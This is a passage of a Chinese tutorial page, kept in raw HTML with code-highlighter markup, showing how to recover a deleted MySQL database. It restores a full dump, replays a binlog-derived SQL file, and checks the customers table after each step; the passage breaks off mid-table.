crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n[root@vm-002 backup]# mysql -uroot -p &lt; ops_2016-09-25.sql\r\nEnter password:\r\n[root@vm-002 backup]#</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b05eaae918925188305-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05eaae918925188305-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594b05eaae918925188305-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b05eaae918925188305-1\"><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">vm</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">002</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">backup</span><span class=\"crayon-sy\">]</span><span class=\"crayon-p\"># mysql -uroot -p &lt; ops_2016-09-25.sql</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05eaae918925188305-2\"><span class=\"crayon-e\">Enter </span><span class=\"crayon-v\">password</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-594b05eaae918925188305-3\"><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">vm</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">002</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">backup</span><span class=\"crayon-sy\">]</span><span class=\"crayon-p\">#</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0009 seconds] -->\r\n<p>查看数据库，看看ops库在不在</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b05eaae91b212154425\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nmysql&gt; show databases;\r\n+--------------------+\r\n| Database |\r\n+--------------------+\r\n| information_schema |\r\n| mysql |\r\n| ops |\r\n| test |\r\n+--------------------+\r\n4 rows in set (0.00 sec)\r\n\r\nmysql&gt; use ops;\r\nReading table information for completion of table and column names\r\nYou can turn off this feature to get a quicker startup with -A\r\n\r\nDatabase changed\r\nmysql&gt; select * from customers;\r\n+----+-----------+-----+\r\n| id | name | age |\r\n+----+-----------+-----+\r\n| 1 | wangbo | 0 |\r\n| 2 | guohui | 0 |\r\n| 3 | zhangheng | 0 |\r\n+----+-----------+-----+\r\n3 rows in set (0.00 sec)</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b05eaae91b212154425-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05eaae91b212154425-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594b05eaae91b212154425-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05eaae91b212154425-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594b05eaae91b212154425-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05eaae91b212154425-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-594b05eaae91b212154425-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05eaae91b212154425-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-594b05eaae91b212154425-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05eaae91b212154425-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-594b05eaae91b212154425-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05eaae91b212154425-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-594b05eaae91b212154425-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05eaae91b212154425-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-594b05eaae91b212154425-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05eaae91b212154425-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-594b05eaae91b212154425-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05eaae91b212154425-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-594b05eaae91b212154425-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05eaae91b212154425-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-594b05eaae91b212154425-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05eaae91b212154425-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-594b05eaae91b212154425-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05eaae91b212154425-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-594b05eaae91b212154425-25\">25</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b05eaae91b212154425-1\"><span class=\"crayon-v\">mysql</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">show </span><span class=\"crayon-v\">databases</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05eaae91b212154425-2\"><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">+</span></div><div class=\"crayon-line\" id=\"crayon-594b05eaae91b212154425-3\"><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Database</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05eaae91b212154425-4\"><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">+</span></div><div class=\"crayon-line\" id=\"crayon-594b05eaae91b212154425-5\"><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">information_schema</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05eaae91b212154425-6\"><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">mysql</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line\" id=\"crayon-594b05eaae91b212154425-7\"><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ops</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05eaae91b212154425-8\"><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">test</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line\" id=\"crayon-594b05eaae91b212154425-9\"><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">+</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05eaae91b212154425-10\"><span class=\"crayon-cn\">4</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">rows </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">set</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">0.00</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">sec</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-594b05eaae91b212154425-11\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05eaae91b212154425-12\"><span class=\"crayon-v\">mysql</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">use</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ops</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-594b05eaae91b212154425-13\"><span class=\"crayon-e\">Reading </span><span class=\"crayon-e\">table </span><span class=\"crayon-e\">information </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">completion </span><span class=\"crayon-e\">of </span><span class=\"crayon-e\">table </span><span class=\"crayon-st\">and</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">column </span><span class=\"crayon-e\">names</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05eaae91b212154425-14\"><span class=\"crayon-e\">You </span><span class=\"crayon-e\">can </span><span class=\"crayon-e\">turn </span><span class=\"crayon-e\">off </span><span class=\"crayon-r\">this</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">feature </span><span class=\"crayon-st\">to</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">get</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">quicker </span><span class=\"crayon-e\">startup </span><span class=\"crayon-v\">with</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">A</span></div><div class=\"crayon-line\" id=\"crayon-594b05eaae91b212154425-15\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05eaae91b212154425-16\"><span class=\"crayon-e\">Database </span><span class=\"crayon-e\">changed</span></div><div class=\"crayon-line\" id=\"crayon-594b05eaae91b212154425-17\"><span class=\"crayon-v\">mysql</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-e \">select *</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">from </span><span class=\"crayon-v\">customers</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05eaae91b212154425-18\"><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span></div><div class=\"crayon-line\" id=\"crayon-594b05eaae91b212154425-19\"><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">id</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">name</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">age</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05eaae91b212154425-20\"><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span></div><div class=\"crayon-line\" id=\"crayon-594b05eaae91b212154425-21\"><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">wangbo</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05eaae91b212154425-22\"><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">guohui</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line\" id=\"crayon-594b05eaae91b212154425-23\"><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">zhangheng</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05eaae91b212154425-24\"><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span></div><div class=\"crayon-line\" id=\"crayon-594b05eaae91b212154425-25\"><span class=\"crayon-cn\">3</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">rows </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">set</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">0.00</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">sec</span><span class=\"crayon-sy\">)</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0052 seconds] -->\r\n<p>此时恢复了全备时刻的数据。接着，使用002bin.sql文件恢复全备时刻到删除数据库之间，新增的数据</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b05eaae91f799994854\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n[root@vm-002 backup]# mysql -uroot -p ops &lt;002bin.sql\r\nEnter password:\r\n[root@vm-002 backup]#</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b05eaae91f799994854-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05eaae91f799994854-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594b05eaae91f799994854-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b05eaae91f799994854-1\"><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">vm</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">002</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">backup</span><span class=\"crayon-sy\">]</span><span class=\"crayon-p\"># mysql -uroot -p ops &lt;002bin.sql</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05eaae91f799994854-2\"><span class=\"crayon-e\">Enter </span><span class=\"crayon-v\">password</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-594b05eaae91f799994854-3\"><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">vm</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">002</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">backup</span><span class=\"crayon-sy\">]</span><span class=\"crayon-p\">#</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0012 seconds] -->\r\n<p>再次查看数据库，发现全备份到删除数据库之间的那部分数据也恢复了！！</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b05eaae922204537540\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nmysql&gt; select * from customers;\r\n+----+-----------+-----+\r\n| id | name | age |\r\n+----+-----------+-----+\r\n| 1 | wangbo | 24 |\r\n| 2 | guohui | 22 |\r\n| 3 | zhangheng | 27 |\r\n| 4 | liupeng | 21 |\r\n| 5 | xiaoda | 31 |\r\n| 6 | fuaiai | 26 |\r\n+----+-----------+-----+\r\n6 rows in set (0.00 sec)</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b05eaae922204537540-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05eaae922204537540-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594b05eaae922204537540-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05eaae922204537540-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594b05eaae922204537540-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05eaae922204537540-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-594b05eaae922204537540-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05eaae922204537540-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-594b05eaae922204537540-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05eaae922204537540-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-594b05eaae922204537540-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05eaae922204537540-12\">12</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b05eaae922204537540-1\"><span class=\"crayon-v\">mysql</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-e \">select *</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">from </span><span class=\"crayon-v\">customers</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05eaae922204537540-2\"><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span></div><div class=\"crayon-line\" id=\"crayon-594b05eaae922204537540-3\"><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">id</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">name</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">age</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05eaae922204537540-4\"><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span></div><div class=\"crayon-line\" id=\"crayon-594b05eaae922204537540-5\"><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">wangbo</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">24</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05eaae922204537540-6\"><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">guohui</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">22</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line\" id=\"crayon-594b05eaae922204537540-7\"><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">zhangheng</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">27</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05eaae922204537540-8\"><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">4</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">liupeng</span><span 